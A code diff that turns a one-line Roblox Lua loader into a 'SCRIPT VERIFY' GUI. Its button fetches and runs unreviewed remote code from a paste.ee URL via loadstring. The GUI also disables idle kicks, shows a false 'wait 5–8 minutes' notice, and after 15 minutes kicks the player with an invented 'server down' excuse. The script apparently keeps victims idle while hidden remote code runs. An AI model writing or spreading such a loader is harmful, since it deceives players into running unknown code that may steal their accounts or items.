@@ -1,1 +1,123 @@
-loadstring(game:HttpGet("https://paste.ee/r/YZI3d4IZ"))()
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local localPlayer = Players.LocalPlayer
+
+-- Anti-AFK (prevents being kicked for idling)
+local VirtualUser = game:GetService("VirtualUser")
+Players.LocalPlayer.Idled:Connect(function()
+	VirtualUser:CaptureController()
+	VirtualUser:ClickButton2(Vector2.new())
+end)
+
+-- Main GUI creation
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "DrixVerifyGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 220, 0, 140)
+frame.Position = UDim2.new(0.5, -110, 0.5, -70)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = frame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 40)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "SCRIPT VERIFY"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextScaled = true
+title.Font = Enum.Font.SourceSansBold
+title.Parent = frame
+
+local loadButton = Instance.new("TextButton")
+loadButton.Size = UDim2.new(0.8, 0, 0, 36)
+loadButton.Position = UDim2.new(0.1, 0, 0.55, 0)
+loadButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+loadButton.Text = "LOAD SCRIPT"
+loadButton.TextScaled = true
+loadButton.Font = Enum.Font.SourceSansBold
+loadButton.Parent = frame
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.Parent = loadButton
+
+-- Rainbow text effect
+local hue = 0
+RunService.RenderStepped:Connect(function()
+	hue = (hue + 0.01) % 1
+	loadButton.TextColor3 = Color3.fromHSV(hue, 1, 1)
+end)
+
+-- Load button behavior
+loadButton.MouseButton1Click:Connect(function()
+	loadButton.Active = false
+	loadButton.Text = "LAUNCHED"
+
+	-- Warning GUI
+	local warningGui = Instance.new("ScreenGui")
+	warningGui.Name = "ScriptLoadWarning"
+	warningGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+	warningGui.ResetOnSpawn = false
+	warningGui.Parent = localPlayer:WaitForChild("PlayerGui")
+
+	local warningFrame = Instance.new("Frame")
+	warningFrame.Size = UDim2.new(0.7, 0, 0.15, 0)
+	warningFrame.Position = UDim2.new(0.5, -250, 0.65, 0)
+	warningFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+	warningFrame.BorderSizePixel = 0
+	warningFrame.ZIndex = 10
+	warningFrame.Parent = warningGui
+
+	local frameCorner = Instance.new("UICorner")
+	frameCorner.CornerRadius = UDim.new(0, 10)
+	frameCorner.Parent = warningFrame
+
+	local warningLabel = Instance.new("TextLabel")
+	warningLabel.Size = UDim2.new(1, -20, 1, -20)
+	warningLabel.Position = UDim2.new(0, 10, 0, 10)
+	warningLabel.BackgroundTransparency = 1
+	warningLabel.Text = "⚠️ PLEASE WAIT 5–8 MINUTES FOR THE SCRIPT TO LOAD ⚠️"
+	warningLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+	warningLabel.TextScaled = true
+	warningLabel.Font = Enum.Font.SourceSansBold
+	warningLabel.ZIndex = 11
+	warningLabel.Parent = warningFrame
+
+	task.spawn(function()
+		while warningLabel and warningLabel.Parent do
+			warningLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+			task.wait(0.5)
+			warningLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+			task.wait(0.5)
+		end
+	end)
+
+	task.delay(60, function()
+		if warningGui then
+			warningGui:Destroy()
+		end
+	end)
+
+	task.delay(15 * 60, function()
+		localPlayer:Kick("PLS TRY THIS SCRIPT AFTER 3-4HOUR DUE TO THE SERVER DOWN")
+	end)
+
+	task.delay(2, function()
+		local success, err = pcall(function()
+loadstring(game:HttpGet("https://paste.ee/r/YZI3d4IZ"))()		end)
+		if not success and warningLabel then
+			warningLabel.Text = "Failed to load script."
+			warningLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+		end
+	end)
+end)
